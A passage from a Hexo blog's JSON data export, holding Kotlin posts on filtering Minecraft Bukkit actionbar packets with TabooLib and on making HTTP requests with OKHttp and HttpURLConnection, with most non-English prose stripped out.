punctuation\">)</span>\n            result<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n            Unit\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token comment\">// </span>\n    runBlocking <span class=\"token punctuation\">&#123;</span>\n        list<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span>\n            it<span class=\"token punctuation\">.</span><span class=\"token function\">await</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> result\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n"},{"title":"NMS","date":"2021-07-18T09:07:39.000Z","author":"","hide":false,"summary":"NMS","_content":"...\nActionbar\n**PacketPlayOutChat**ActionbarActionbar\n**low**GUIGUItitleInventoryHolder\n\nPacketPlayOutChat\nTaboolib**ASMVersionControl**\n\n\n\n**PacketPlayOutChat**\n\n```kotlin\nclass LegalActionBarPacket(iChatBaseComponent: IChatBaseComponent, chatMessageType: ChatMessageType, uuid: UUID) : PacketPlayOutChat(iChatBaseComponent,chatMessageType,uuid)\n```\n**ASMVersionControl**\n\n```kotlin\nval legalPacketClass = AsmVersionControl.createNMS(\"me.asgard.coldrain.hud.module.nms.LegalActionBarPacket\").mapping().translate(SacredHUD.plugin) \n```\n****\n\n```kotlin\n    @TPacket(type = TPacket.Type.SEND)\n    private fun send(player: Player, packet: Packet): Boolean {\n        if (packet.equals(\"PacketPlayOutChat\")\n                && packet.read(\"b\").reflex<Byte>(\"d\") == 2.toByte()\n                && packet.get().javaClass != legalPacketClass){\n            return false\n        }\n        return true\n    }\n```\n\nlegalPacket\nlegalPacketilegal packet\n","source":"_posts/nms-packet-name-check.md","raw":"---\ntitle: NMS\ndate: 2021-07-18 17:07:39\nauthor: \nhide: false\nsummary: NMS\ncategories: \ntags:\n  - Bukkit\n  - Kotlin\n  - TabooLib\n---\n...\nActionbar\n**PacketPlayOutChat**ActionbarActionbar\n**low**GUIGUItitleInventoryHolder\n\nPacketPlayOutChat\nTaboolib**ASMVersionControl**\n\n\n\n**PacketPlayOutChat**\n\n```kotlin\nclass LegalActionBarPacket(iChatBaseComponent: IChatBaseComponent, chatMessageType: ChatMessageType, uuid: UUID) : PacketPlayOutChat(iChatBaseComponent,chatMessageType,uuid)\n```\n**ASMVersionControl**\n\n```kotlin\nval legalPacketClass = AsmVersionControl.createNMS(\"me.asgard.coldrain.hud.module.nms.LegalActionBarPacket\").mapping().translate(SacredHUD.plugin) \n```\n****\n\n```kotlin\n    @TPacket(type = TPacket.Type.SEND)\n    private fun send(player: Player, packet: Packet): Boolean {\n        if (packet.equals(\"PacketPlayOutChat\")\n                && packet.read(\"b\").reflex<Byte>(\"d\") == 2.toByte()\n                && packet.get().javaClass != legalPacketClass){\n            return false\n        }\n        return true\n    }\n```\n\nlegalPacket\nlegalPacketilegal packet\n","slug":"nms-packet-name-check","published":1,"updated":"2022-12-12T15:52:28.637Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtq001zsfklcm6g2vie","content":"<p><br>Actionbar<br><strong>PacketPlayOutChat</strong>ActionbarActionbar<br><strong>low</strong>GUIGUItitleInventoryHolder<br><br>PacketPlayOutChat<br>Taboolib<strong>ASMVersionControl</strong><br><br><br><br><strong>PacketPlayOutChat</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">LegalActionBarPacket</span><span class=\"token punctuation\">(</span>iChatBaseComponent<span class=\"token operator\">:</span> IChatBaseComponent<span class=\"token punctuation\">,</span> chatMessageType<span class=\"token operator\">:</span> ChatMessageType<span class=\"token punctuation\">,</span> uuid<span class=\"token operator\">:</span> UUID<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">PacketPlayOutChat</span><span class=\"token punctuation\">(</span>iChatBaseComponent<span class=\"token punctuation\">,</span>chatMessageType<span class=\"token punctuation\">,</span>uuid<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><strong>ASMVersionControl</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> legalPacketClass <span class=\"token operator\">=</span> AsmVersionControl<span class=\"token punctuation\">.</span><span class=\"token function\">createNMS</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"me.asgard.coldrain.hud.module.nms.LegalActionBarPacket\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">translate</span><span class=\"token punctuation\">(</span>SacredHUD<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><strong></strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token annotation builtin\">@TPacket</span><span class=\"token punctuation\">(</span>type <span class=\"token operator\">=</span> TPacket<span class=\"token punctuation\">.</span>Type<span class=\"token punctuation\">.</span>SEND<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>player<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">,</span> packet<span class=\"token operator\">:</span> Packet<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>packet<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PacketPlayOutChat\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token operator\">&amp;&amp;</span> packet<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reflex<span class=\"token operator\">&lt;</span>Byte<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"d\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">.</span><span class=\"token function\">toByte</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token operator\">&amp;&amp;</span> packet<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>javaClass <span class=\"token operator\">!=</span> legalPacketClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>legalPacket<br>legalPacketilegal packet</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<p><br>Actionbar<br><strong>PacketPlayOutChat</strong>ActionbarActionbar<br><strong>low</strong>GUIGUItitleInventoryHolder<br><br>PacketPlayOutChat<br>Taboolib<strong>ASMVersionControl</strong><br><br><br><br><strong>PacketPlayOutChat</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">LegalActionBarPacket</span><span class=\"token punctuation\">(</span>iChatBaseComponent<span class=\"token operator\">:</span> IChatBaseComponent<span class=\"token punctuation\">,</span> chatMessageType<span class=\"token operator\">:</span> ChatMessageType<span class=\"token punctuation\">,</span> uuid<span class=\"token operator\">:</span> UUID<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">PacketPlayOutChat</span><span class=\"token punctuation\">(</span>iChatBaseComponent<span class=\"token punctuation\">,</span>chatMessageType<span class=\"token punctuation\">,</span>uuid<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><strong>ASMVersionControl</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> legalPacketClass <span class=\"token operator\">=</span> AsmVersionControl<span class=\"token punctuation\">.</span><span class=\"token function\">createNMS</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"me.asgard.coldrain.hud.module.nms.LegalActionBarPacket\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">translate</span><span class=\"token punctuation\">(</span>SacredHUD<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><strong></strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token annotation builtin\">@TPacket</span><span class=\"token punctuation\">(</span>type <span class=\"token operator\">=</span> TPacket<span class=\"token punctuation\">.</span>Type<span class=\"token punctuation\">.</span>SEND<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>player<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">,</span> packet<span class=\"token operator\">:</span> Packet<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>packet<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PacketPlayOutChat\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token operator\">&amp;&amp;</span> packet<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reflex<span class=\"token operator\">&lt;</span>Byte<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token string\">\"d\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">.</span><span class=\"token function\">toByte</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token operator\">&amp;&amp;</span> packet<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>javaClass <span class=\"token operator\">!=</span> legalPacketClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>legalPacket<br>legalPacketilegal packet</p>\n"},{"title":"OKHttp/HttpURLConnection","date":"2021-11-13T16:00:00.000Z","author":"","hide":false,"summary":"OKHttp/HttpURLConnection","_content":"\n# OKHttp/HttpURLConnection\n\n\n\n~~~kotlin\n    // OKHttp\n    private fun okHttpPost() {\n        coroutineScope.launch(Dispatchers.IO) {\n            val requestBody = FormBody.Builder()\n                .add(\"user\", \"admin\")\n                .add(\"password\", \"123456\")\n                .build()\n            val request = Request.Builder()\n                .url(\"https://www.baidu.com\")\n                .post(requestBody)\n                .build()\n            // \n        }\n    }\n\n    // OKHttp\n    // HttpUrlConnection\n    private fun okHttpPull() {\n        coroutineScope.launch(Dispatchers.IO) {\n            try {\n                val client = OkHttpClient()\n                val request = Request.Builder()\n                    .url(\"https://www.baidu.com\")\n                    .build()\n                val response = client.newCall(request).execute()\n                val data = response.body?.string()\n                if (data != null) {\n                    withContext(Dispatchers.Main) {\n                        binding.responseText.text = data\n                    }\n                }\n            } catch (e: Exception) {\n                e.printStackTrace()\n            }\n        }\n    }\n\n    // HttpURLConnection\n    private fun httpUrlConnectionPost() {\n        val connection: HttpURLConnection? = null\n        //  connection\n        connection!!.requestMethod = \"POST\"\n        val output = DataOutputStream(connection.outputStream)\n        output.writeBytes(\"username=admin&password=123456\")\n    }\n\n    // HttpURLConnection\n    private fun httpUrlConnectionPull() {\n        // Dispatchers.IO\n        coroutineScope.launch(Dispatchers.IO) {\n            var connection: HttpURLConnection? = null\n            try {\n                val response = StringBuilder()\n                val url = URL(\"https://www.baidu.com\")\n                connection = url.openConnection() as HttpURLConnection\n                connection.connectTimeout = 8000\n                connection.readTimeout = 8000\n                val input = connection.inputStream\n                val reader = BufferedReader(InputStreamReader(input))\n                reader.use {\n                    reader.forEachLine {\n                        response.append(it)\n                    }\n                }\n                // Dispatcher.IO\n                withContext(Dispatchers.Main) {\n                    binding.responseText.text = response.toString()\n                }\n            } catch (e: Exception) {\n                e.printStackTrace()\n            } finally {\n                connection?.disconnect()\n            }\n        }\n    }\n~~~\n\n\n\n","source":"_posts/okhttp-usage.md","raw":"---\ntitle: OKHttp/HttpURLConnection\ndate: 2021-11-14\nauthor: \nhide: false\nsummary: OKHttp/HttpURLConnection\ncategories: \ntags:\n  - Kotlin\n  - \n  - \n---\n\n# OKHttp/HttpURLConnection\n\n\n\n~~~kotlin\n    // OKHttp\n    private fun okHttpPost() {\n        coroutineScope.launch(Dispatchers.IO) {\n            val requestBody = FormBody.Builder()\n                .add(\"user\", \"admin\")\n                .add(\"password\", \"123456\")\n                .build()\n            val request = Request.Builder()\n                .url(\"https://www.baidu.com\")\n                .post(requestBody)\n                .build()\n            // \n        }\n    }\n\n    // OKHttp\n    // HttpUrlConnection\n    private fun okHttpPull() {\n        coroutineScope.launch(Dispatchers.IO) {\n            try {\n                val client = OkHttpClient()\n                val request = Request.Builder()\n                    .url(\"https://www.baidu.com\")\n                    .build()\n                val response = client.newCall(request).execute()\n                val data = response.body?.string()\n                if (data != null) {\n                    withContext(Dispatchers.Main) {\n                        binding.responseText.text = data\n                    }\n                }\n            } catch (e: Exception) {\n                e.printStackTrace()\n            }\n        }\n    }\n\n    // HttpURLConnection\n    private fun httpUrlConnectionPost() {\n        val connection: HttpURLConnection? = null\n        //  connection\n        connection!!.requestMethod = \"POST\"\n        val output = DataOutputStream(connection.outputStream)\n        output.writeBytes(\"username=admin&password=123456\")\n    }\n\n    // HttpURLConnection\n    private fun httpUrlConnectionPull() {\n        // Dispatchers.IO\n        coroutineScope.launch(Dispatchers.IO) {\n            var connection: HttpURLConnection? = null\n            try {\n                val response = StringBuilder()\n                val url = URL(\"https://www.baidu.com\")\n                connection = url.openConnection() as HttpURLConnection\n                connection.connectTimeout = 8000\n                connection.readTimeout = 8000\n                val input = connection.inputStream\n                val reader = BufferedReader(InputStreamReader(input))\n                reader.use {\n                    reader.forEachLine {\n                        response.append(it)\n                    }\n                }\n                // Dispatcher.IO\n                withContext(Dispatchers.Main) {\n                    binding.responseText.text = response.toString()\n                }\n            } catch (e: Exception) {\n                e.printStackTrace()\n            } finally {\n                connection?.disconnect()\n            }\n        }\n    }\n~~~\n\n\n\n","slug":"okhttp-usage","published":1,"updated":"2022-11-24T02:49:32.232Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtr0022sfkl1hq5boc3","content":"<h1 id=\"OKHttp-x2F-HttpURLConnection\"><a href=\"#OKHttp-x2F-HttpURLConnection\" class=\"headerlink\" title=\"OKHttp/HttpURLConnection\"></a>OKHttp/HttpURLConnection</h1><p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// OKHttp</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">okHttpPost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    coroutineScope<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> requestBody <span class=\"token operator\">=</span> FormBody<span class=\"token punctuation\">.</span><span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> request <span class=\"token operator\">=</span> Request<span class=\"token punctuation\">.</span><span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span>requestBody<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// </span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// OKHttp</span>\n<span class=\"token comment\">// HttpUrlConnection</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">okHttpPull</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    coroutineScope<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">val</span> client <span class=\"token operator\">=</span> <span class=\"token function\">OkHttpClient</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> request <span class=\"token operator\">=</span> Request<span class=\"token punctuation\">.</span><span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> response <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span><span class=\"token function\">newCall</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>body<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">withContext</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>Main<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    binding<span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> <span class=\"token keyword\">data</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> Exception<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// HttpURLConnection</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">httpUrlConnectionPost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> connection<span class=\"token operator\">:</span> HttpURLConnection<span class=\"token operator\">?</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span>\n    <span class=\"token comment\">//  connection</span>\n    connection<span class=\"token operator\">!!</span><span class=\"token punctuation\">.</span>requestMethod <span class=\"token operator\">=</span> <span class=\"token string\">\"POST\"</span>\n    <span class=\"token keyword\">val</span> output <span class=\"token operator\">=</span> <span class=\"token function\">DataOutputStream</span><span class=\"token punctuation\">(</span>connection<span class=\"token punctuation\">.</span>outputStream<span class=\"token punctuation\">)</span>\n    output<span class=\"token punctuation\">.</span><span class=\"token function\">writeBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username=admin&amp;password=123456\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// HttpURLConnection</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">httpUrlConnectionPull</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// Dispatchers.IO</span>\n    coroutineScope<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">var</span> connection<span class=\"token operator\">:</span> HttpURLConnection<span class=\"token operator\">?</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">val</span> response <span class=\"token operator\">=</span> <span class=\"token function\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> url <span class=\"token operator\">=</span> <span class=\"token function\">URL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">)</span>\n            connection <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">openConnection</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> HttpURLConnection\n            connection<span class=\"token punctuation\">.</span>connectTimeout <span class=\"token operator\">=</span> <span class=\"token number\">8000</span>\n            connection<span class=\"token punctuation\">.</span>readTimeout <span class=\"token operator\">=</span> <span class=\"token number\">8000</span>\n            <span class=\"token keyword\">val</span> input <span class=\"token operator\">=</span> connection<span class=\"token punctuation\">.</span>inputStream\n            <span class=\"token keyword\">val</span> reader <span class=\"token operator\">=</span> <span class=\"token function\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token function\">InputStreamReader</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            reader<span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span>\n                reader<span class=\"token punctuation\">.</span><span class=\"token function\">forEachLine</span> <span class=\"token punctuation\">{</span>\n                    response<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span>it<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token comment\">// Dispatcher.IO</span>\n            <span class=\"token function\">withContext</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>Main<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                binding<span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> Exception<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">{</span>\n            connection<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">disconnect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"OKHttp-x2F-HttpURLConnection\"><a href=\"#OKHttp-x2F-HttpURLConnection\" class=\"headerlink\" title=\"OKHttp&#x2F;HttpURLConnection\"></a>OKHttp&#x2F;HttpURLConnection</h1><p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// OKHttp</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">okHttpPost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    coroutineScope<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> requestBody <span class=\"token operator\">=</span> FormBody<span class=\"token punctuation\">.</span><span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> request <span class=\"token operator\">=</span> Request<span class=\"token punctuation\">.</span><span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">)</span>\n            <span 